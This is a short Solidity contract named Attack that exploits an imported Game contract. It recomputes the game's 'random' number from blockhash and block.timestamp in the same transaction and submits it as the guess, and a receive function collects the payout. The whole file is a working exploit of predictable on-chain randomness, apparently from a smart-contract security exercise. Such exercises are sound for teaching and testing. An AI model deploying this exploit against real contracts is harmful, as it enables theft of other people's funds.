//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Game.sol';

contract Attack {
    Game game;
    constructor (address _game) { 
        game = Game (_game);
    }

    function attack() public {
        uint num = uint(keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)));
        game.guess(num);
    }
    
    receive() external payable{}
}